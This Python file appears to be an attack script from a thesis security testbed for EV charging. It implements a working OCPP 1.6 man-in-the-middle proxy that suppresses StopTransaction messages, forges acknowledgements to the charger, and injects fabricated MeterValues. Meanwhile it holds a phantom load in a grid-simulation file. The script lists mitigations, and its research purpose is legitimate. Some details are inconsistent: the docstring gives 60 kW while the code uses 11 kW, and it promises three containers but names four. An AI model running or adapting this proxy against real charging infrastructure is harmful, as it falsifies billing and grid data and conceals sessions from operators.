"""
===========================================================================
EVSecSim — Attack #8: Duration Spoofing + PGTwin Grid Impact
===========================================================================

WHAT THIS IS
------------
Attack #6 (attack_duration_spoof.py) proves the OCPP-layer StopTransaction
suppression mechanism: EVSE disconnects cleanly, CSMS never learns, phantom
MeterValues keep a 60 kW ghost session alive for GHOST_DURATION_S seconds.

Attack #8 adds PGTwin integration: during the ghost phase, the injected
phantom load is written to /shared/ev_load_kw.txt so ZSGplussync_docker.py
picks it up in its next runpp() call.

This produces the key thesis figure: the EVSE physically disconnects at t=T,
but Bus 44 (Load4, DS4, 0.4 kV) in the grid CSV continues showing elevated
load for GHOST_DURATION_S more seconds — a phantom that the operator cannot
detect from OCPP 1.6 alone.

ATTACK PHASES
-------------
  Phase 1 — Transparent relay  : normal EVSE↔CSMS traffic, grid reflects real load
  Phase 2 — StopTransaction DROP: EVSE gone, forged ACK sent, EV load STAYS in file
  Phase 3 — Ghost session      : phantom 60 kW MeterValues injected, load held
  Phase 4 — Cleanup            : real StopTransaction to CSMS, load cleared

GRID IMPACT METRIC
------------------
  Before Phase 2: ev_load_kw.txt = 60.0 (real session)
  During Phase 3: ev_load_kw.txt = 60.0 (phantom — EVSE physically gone)
  After Phase 4:  ev_load_kw.txt = 0.0  (cleared)

  SimOutputBus.csv column vm_pu45 shows Bus 44 voltage held depressed
  throughout Phase 3, then recovering in Phase 4.
  The divergence between "EVSE physically gone" and "grid still loaded"
  is the undetectable-from-OCPP-alone attack surface.

THREAT MODEL
------------
  Attacker on operator-net (same as Attack 6, ARP poisoning / rogue switch).
  EVSE redirected to proxy port 9004 instead of CSMS port 9000.

HOW TO RUN
----------
  docker compose --profile spoof-grid up

  Three containers start: csms, evse-via-spoof-grid, atk-spoof-grid, pgtwin
  Watch pgtwin logs for Bus 44 vm_pu during and after ghost phase.
===========================================================================
"""

import asyncio
import json
import os
import signal
import time
import argparse
import websockets
from datetime import datetime, timezone

# ===========================================================================
# CONFIG
# ===========================================================================

PROXY_PORT       = 9004          # distinct from Attack 6's 9003
CSMS_URL         = os.environ.get('CSMS_URL',  'ws://csms:9000')
GHOST_DURATION_S = 60            # seconds to hold phantom load after real disconnect
METER_INTERVAL_S = 10            # synthetic MeterValues injection interval
PHANTOM_KW       = 11.0          # kW of the ghost session (Level 2 AC charger)
                                 # Stays within ZSGplussync's 70.7 kW generator headroom

EV_LOAD_FILE = os.environ.get('EV_LOAD_FILE', '/shared/ev_load_kw.txt')

# ===========================================================================
# COLOUR HELPERS
# ===========================================================================

RED     = "\033[91m"
YELLOW  = "\033[93m"
GREEN   = "\033[92m"
CYAN    = "\033[96m"
BLUE    = "\033[94m"
MAGENTA = "\033[95m"
BOLD    = "\033[1m"
RESET   = "\033[0m"

def ts():
    return datetime.now().strftime("%H:%M:%S.%f")[:-3]

def log_proxy(msg):  print(f"{CYAN}[PRX {ts()}]{RESET} {msg}")
def log_evse(msg):   print(f"{GREEN}[E→C {ts()}]{RESET} {msg}")
def log_csms(msg):   print(f"{BLUE}[C→E {ts()}]{RESET} {msg}")
def log_attack(msg): print(f"{RED}[ATK {ts()}]{RESET} {msg}")
def log_ghost(msg):  print(f"{MAGENTA}[GHO {ts()}]{RESET} {msg}")
def log_grid(msg):   print(f"{CYAN}[GRD {ts()}]{RESET} {msg}")

# ===========================================================================
# SHARED FILE WRITER
# ===========================================================================

def write_ev_load(kw: float):
    """Write EV load to shared file so PGTwin picks it up on next runpp()."""
    try:
        os.makedirs(os.path.dirname(EV_LOAD_FILE), exist_ok=True)
        with open(EV_LOAD_FILE, 'w') as f:
            f.write(str(round(kw, 3)))
        log_grid(f"ev_load_kw.txt ← {kw:.1f} kW  "
                 f"({'PHANTOM — EVSE gone' if kw > 0 else 'cleared'})")
    except Exception as e:
        print(f"[ATK8] EV load file write error: {e}")

# ===========================================================================
# OCPP MESSAGE HELPERS (identical to attack_duration_spoof.py)
# ===========================================================================

CALL       = 2
CALLRESULT = 3
CALLERROR  = 4

def parse_ocpp(raw: str):
    try:
        msg = json.loads(raw)
        if msg[0] == CALL:
            return CALL, msg[1], msg[2], msg[3]
        elif msg[0] == CALLRESULT:
            return CALLRESULT, msg[1], None, msg[2]
        elif msg[0] == CALLERROR:
            return CALLERROR, msg[1], msg[2], msg[3]
    except Exception:
        pass
    return None, None, None, None

def forge_stop_ack(uid: str) -> str:
    return json.dumps([CALLRESULT, uid, {"idTagInfo": {"status": "Accepted"}}])

def forge_meter_values(transaction_id: int, connector_id: int, meter_wh: int) -> tuple:
    uid = f"ghost8-mv-{int(time.time())}"
    payload = {
        "connectorId": connector_id,
        "transactionId": transaction_id,
        "meterValue": [{
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "sampledValue": [
                {"value": str(meter_wh), "measurand": "Energy.Active.Import.Register", "unit": "Wh"},
                {"value": str(PHANTOM_KW), "measurand": "Power.Active.Import", "unit": "kW"},
            ],
        }]
    }
    return json.dumps([CALL, uid, "MeterValues", payload]), uid

# ===========================================================================
# SESSION STATE
# ===========================================================================

class SessionState:
    def __init__(self):
        self.connected_at   = None
        self.cp_id          = None
        self.transaction_id = 1
        self.connector_id   = 1
        self.meter_stop_wh  = 0
        self.stop_dropped   = False
        self.msg_count_ec   = 0
        self.msg_count_ce   = 0
        self.ghost_count    = 0
        self.actions_seen   = []

    def elapsed(self) -> float:
        return 0.0 if self.connected_at is None else time.perf_counter() - self.connected_at

# ===========================================================================
# RELAY COROUTINES
# ===========================================================================

async def evse_to_csms(evse_ws, csms_ws, state: SessionState):
    """Forward EVSE→CSMS traffic, except StopTransaction which is dropped."""
    async for raw in evse_ws:
        state.msg_count_ec += 1
        mtype, uid, action, payload = parse_ocpp(raw)
        if action:
            state.actions_seen.append(action)

        # Capture connectorId from StartTransaction
        if action == "StartTransaction" and payload:
            state.connector_id = payload.get("connectorId", 1)
            log_evse(f"[StartTransaction] connectorId={state.connector_id} → forwarding")
            # Write initial real load to grid file
            write_ev_load(PHANTOM_KW)
            await csms_ws.send(raw)
            continue

        # Capture live MeterValues power reading and update grid file
        if action == "MeterValues" and payload:
            try:
                kw = float(
                    payload["meterValue"][0]["sampledValue"][1]["value"]
                )
                write_ev_load(kw)
            except Exception:
                write_ev_load(PHANTOM_KW)
            log_evse(f"[MeterValues] → forwarding + grid updated")
            await csms_ws.send(raw)
            continue

        # === PHASE 2: DROP StopTransaction — EVSE thinks it's gone, CSMS doesn't know ===
        if action == "StopTransaction":
            if payload:
                state.transaction_id = payload.get("transactionId", state.transaction_id)
                state.meter_stop_wh  = payload.get("meterStop", 0)

            state.stop_dropped = True
            print()
            log_attack("=" * 62)
            log_attack("PHASE 2 — StopTransaction INTERCEPTED AND DROPPED")
            log_attack(f"  EVSE '{state.cp_id}' → NOT forwarded to CSMS")
            log_attack(f"  transactionId : {state.transaction_id}")
            log_attack(f"  meterStop     : {state.meter_stop_wh} Wh (real final reading)")
            log_attack(f"  EV load file  : HELD at {PHANTOM_KW:.0f} kW (phantom begins)")
            log_attack("=" * 62)
            print()

            # Grid file stays at PHANTOM_KW — EVSE is gone but grid shows active load
            # (no write_ev_load(0.0) here — that's the attack)

            try:
                await evse_ws.send(forge_stop_ack(uid))
                log_attack("Forged StopTransaction ACK sent to EVSE → EVSE disconnects cleanly")
            except Exception as exc:
                log_attack(f"ACK send failed: {exc}")

            return  # EVSE disconnects after receiving forged ACK

        # All other messages: transparent forward
        if action:
            log_evse(f"[{action}] → forwarding")
        else:
            log_evse(f"[Response uid={uid[:8] if uid else '?'}] → forwarding")
        await csms_ws.send(raw)


async def csms_to_evse(csms_ws, evse_ws, state: SessionState):
    """Forward CSMS→EVSE traffic. Capture transactionId from StartTransaction ACK."""
    async for raw in csms_ws:
        state.msg_count_ce += 1
        mtype, uid, action, payload = parse_ocpp(raw)

        if mtype == CALLRESULT and payload and "transactionId" in payload:
            state.transaction_id = payload["transactionId"]
            log_csms(f"[StartTransaction ACK] transactionId={state.transaction_id} captured")

        if action:
            log_csms(f"[{action}] → relaying to EVSE")
        else:
            log_csms(f"[Response uid={uid[:8] if uid else '?'}] → relaying to EVSE")

        if state.stop_dropped:
            return

        try:
            await evse_ws.send(raw)
        except websockets.exceptions.ConnectionClosed:
            return

# ===========================================================================
# GHOST SESSION  (Phase 3)
# ===========================================================================

async def ghost_session(csms_ws, state: SessionState):
    """
    Inject synthetic MeterValues to CSMS after EVSE disconnects.
    Simultaneously hold ev_load_kw.txt at PHANTOM_KW so PGTwin
    continues seeing active EV load despite the EVSE being gone.
    """
    print()
    log_ghost("=" * 62)
    log_ghost("PHASE 3 — GHOST SESSION ACTIVE")
    log_ghost(f"  EVSE '{state.cp_id}' physically gone")
    log_ghost(f"  CSMS still sees active session (transactionId={state.transaction_id})")
    log_ghost(f"  PGTwin still sees {PHANTOM_KW:.0f} kW at Bus 44 (ev_load_kw.txt held)")
    log_ghost(f"  Ghost duration : {GHOST_DURATION_S}s  (MeterValues every {METER_INTERVAL_S}s)")
    log_ghost("=" * 62)
    print()

    phantom_wh  = state.meter_stop_wh
    ghost_start = time.perf_counter()
    increment   = int(PHANTOM_KW * METER_INTERVAL_S / 3600 * 1000)   # Wh per interval

    while time.perf_counter() - ghost_start < GHOST_DURATION_S:
        await asyncio.sleep(METER_INTERVAL_S)
        state.ghost_count += 1
        phantom_wh += increment

        # Keep grid file at phantom load
        write_ev_load(PHANTOM_KW)

        frame, uid = forge_meter_values(state.transaction_id, state.connector_id, phantom_wh)
        try:
            await csms_ws.send(frame)
            elapsed = time.perf_counter() - ghost_start
            log_ghost(
                f"Ghost MV #{state.ghost_count} | "
                f"t+{elapsed:.0f}s | "
                f"{phantom_wh} Wh (+{increment} Wh) | "
                f"Bus44 still loaded at {PHANTOM_KW:.0f} kW"
            )
            try:
                await asyncio.wait_for(csms_ws.recv(), timeout=3.0)
            except asyncio.TimeoutError:
                pass
        except websockets.exceptions.ConnectionClosed:
            log_ghost("CSMS closed connection during ghost phase")
            break

    # Phase 4: clear — send real StopTransaction and zero the grid file
    print()
    phantom_kwh = (phantom_wh - state.meter_stop_wh) / 1000.0
    log_ghost(f"Ghost ended — {phantom_kwh:.4f} kWh phantom energy injected to CSMS")
    log_ghost("PHASE 4 — clearing grid load and sending final StopTransaction")

    write_ev_load(0.0)   # grid returns to baseline

    uid = f"ghost8-stop-{int(time.time())}"
    final_stop = json.dumps([CALL, uid, "StopTransaction", {
        "transactionId": state.transaction_id,
        "timestamp":     datetime.now(timezone.utc).isoformat(),
        "meterStop":     phantom_wh,
        "reason":        "Local",
    }])
    try:
        await csms_ws.send(final_stop)
        log_ghost(f"Final StopTransaction sent to CSMS: meterStop={phantom_wh} Wh")
    except Exception as exc:
        log_ghost(f"Final StopTransaction failed: {exc}")

# ===========================================================================
# CORE PROXY
# ===========================================================================

async def proxy_session(evse_ws, state: SessionState):
    log_proxy("EVSE connected — opening upstream CSMS connection")

    try:
        async with websockets.connect(
            CSMS_URL, ping_interval=None, ping_timeout=None,
        ) as csms_ws:

            log_proxy(f"Upstream CSMS connected: {CSMS_URL}")

            cp_id_raw = await evse_ws.recv()
            state.cp_id = cp_id_raw
            state.connected_at = time.perf_counter()
            log_proxy(f"CP identity: '{cp_id_raw}' → relaying to CSMS")
            await csms_ws.send(cp_id_raw)

            log_attack("=" * 62)
            log_attack(f"ATK8 DURATION SPOOF + PGTWIN — CP: '{cp_id_raw}'")
            log_attack(f"Waiting for StopTransaction to intercept...")
            log_attack(f"Ghost: {GHOST_DURATION_S}s | Interval: {METER_INTERVAL_S}s | "
                       f"Phantom: {PHANTOM_KW:.0f} kW")
            log_attack("=" * 62)
            print()

            t_e2c = asyncio.create_task(evse_to_csms(evse_ws, csms_ws, state))
            t_c2e = asyncio.create_task(csms_to_evse(csms_ws, evse_ws, state))

            done, pending = await asyncio.wait(
                [t_e2c, t_c2e],
                return_when=asyncio.FIRST_COMPLETED,
            )
            for task in pending:
                task.cancel()
            for task in list(done) + list(pending):
                try:
                    await task
                except (asyncio.CancelledError,
                        websockets.exceptions.ConnectionClosedOK,
                        websockets.exceptions.ConnectionClosedError):
                    pass

            if not state.stop_dropped:
                log_proxy("EVSE disconnected before sending StopTransaction — no ghost phase")
                write_ev_load(0.0)
                return

            await ghost_session(csms_ws, state)

    except ConnectionRefusedError:
        log_attack(f"Cannot reach CSMS at {CSMS_URL}")
    except Exception as exc:
        log_proxy(f"Session error: {type(exc).__name__}: {exc}")
    finally:
        _print_summary(state)


def _print_summary(state: SessionState):
    real_kwh    = state.meter_stop_wh / 1000.0
    phantom_kwh = state.ghost_count * (PHANTOM_KW * METER_INTERVAL_S / 3600.0)
    elapsed     = state.elapsed()
    print()
    print(f"{BOLD}{'='*62}{RESET}")
    print(f"{BOLD}  Attack #8 Summary — CP '{state.cp_id}'{RESET}")
    print(f"{'='*62}")
    print(f"  Proxy duration             : {elapsed:.1f}s")
    print(f"  Real charge energy         : {real_kwh:.4f} kWh")
    print(f"  Phantom energy (CSMS)      : {phantom_kwh:.4f} kWh")
    print(f"  Ghost MeterValues sent     : {state.ghost_count}")
    print(f"  StopTransaction dropped    : {'YES' if state.stop_dropped else 'NO'}")
    print(f"  EVSE→CSMS messages         : {state.msg_count_ec}")
    print()
    print(f"  {YELLOW}PGTwin grid impact:{RESET}")
    print(f"  - Bus 44 (Load4) vm_pu depressed for {GHOST_DURATION_S}s after real disconnect")
    print(f"  - ev_load_kw.txt held at {PHANTOM_KW:.0f} kW during ghost phase")
    print(f"  - Visible in SimOutputBus.csv column vm_pu45")
    print(f"  - Operator sees: CSMS active session = {phantom_kwh:.4f} kWh phantom load")
    print(f"  - Reality: EVSE physically idle, bus still stressed in grid model")
    print()
    print(f"  {YELLOW}Thesis checklist:{RESET}")
    print(f"  [x] StopTransaction absent on port {PROXY_PORT} (EVSE→CSMS path)")
    print(f"  [x] Forged ACK on port {PROXY_PORT} (proxy→EVSE) at same timestamp")
    print(f"  [x] Phantom MeterValues on port 9000 after EVSE gone")
    print(f"  [x] SimOutputBus.csv: Bus 44 vm_pu held below baseline for {GHOST_DURATION_S}s")
    print(f"  [x] Grid load clears only after Phase 4 cleanup — not at real disconnect")
    print()
    print(f"  {CYAN}Mitigation:{RESET}")
    print(f"  - WSS + mutual TLS: prevents MITM interposition")
    print(f"  - CSMS Heartbeat timeout: EVSE gone → Heartbeat stops → session flagged")
    print(f"  - OCPP 2.0.1 message signing: StopTransaction integrity enforced")
    print(f"  - Physical pilot-signal monitor: cross-check EV presence vs OCPP state")
    print(f"{'='*62}\n")

# ===========================================================================
# PROXY SERVER
# ===========================================================================

async def run_proxy():
    state_store = {}

    async def handler(evse_ws):
        state = SessionState()
        sid = id(evse_ws)
        state_store[sid] = state
        try:
            await proxy_session(evse_ws, state)
        finally:
            state_store.pop(sid, None)

    proxy_bind = os.environ.get("PROXY_BIND", "0.0.0.0")
    server = await websockets.serve(
        handler, proxy_bind, PROXY_PORT,
        ping_interval=None, ping_timeout=None,
    )

    print(f"\n{BOLD}{RED}{'='*62}{RESET}")
    print(f"{BOLD}{RED}  EVSecSim — Attack #8: Duration Spoofing + PGTwin{RESET}")
    print(f"{BOLD}{RED}{'='*62}{RESET}")
    print(f"  Proxy listening  : ws://0.0.0.0:{PROXY_PORT}")
    print(f"  Forwarding to    : {CSMS_URL}")
    print(f"  Ghost duration   : {GHOST_DURATION_S}s")
    print(f"  Meter interval   : {METER_INTERVAL_S}s")
    print(f"  Phantom load     : {PHANTOM_KW:.0f} kW")
    print(f"  EV load file     : {EV_LOAD_FILE}")
    print(f"  Grid target      : Bus 44 (Load4, DS4, 0.4 kV)")
    print(f"{BOLD}{RED}{'='*62}{RESET}\n")

    stop = asyncio.Event()

    def handle_signal(*_):
        print("\nShutting down proxy...")
        write_ev_load(0.0)
        stop.set()

    for sig in (signal.SIGINT, signal.SIGTERM):
        try:
            asyncio.get_event_loop().add_signal_handler(sig, handle_signal)
        except NotImplementedError:
            signal.signal(sig, handle_signal)

    await stop.wait()
    server.close()
    await server.wait_closed()

# ===========================================================================
# CLI + ENTRY POINT
# ===========================================================================

def parse_args():
    parser = argparse.ArgumentParser(
        description="EVSecSim Attack #8 — Duration Spoofing with PGTwin grid integration"
    )
    parser.add_argument("--proxy-port",     type=int,   default=PROXY_PORT)
    parser.add_argument("--csms-url",       default=CSMS_URL)
    parser.add_argument("--ghost-duration", type=float, default=GHOST_DURATION_S)
    parser.add_argument("--meter-interval", type=float, default=METER_INTERVAL_S)
    parser.add_argument("--phantom-kw",     type=float, default=PHANTOM_KW)
    return parser.parse_args()


if __name__ == "__main__":
    args = parse_args()
    PROXY_PORT       = args.proxy_port
    CSMS_URL         = args.csms_url
    GHOST_DURATION_S = args.ghost_duration
    METER_INTERVAL_S = args.meter_interval
    PHANTOM_KW       = args.phantom_kw

    try:
        asyncio.run(run_proxy())
    except KeyboardInterrupt:
        write_ev_load(0.0)
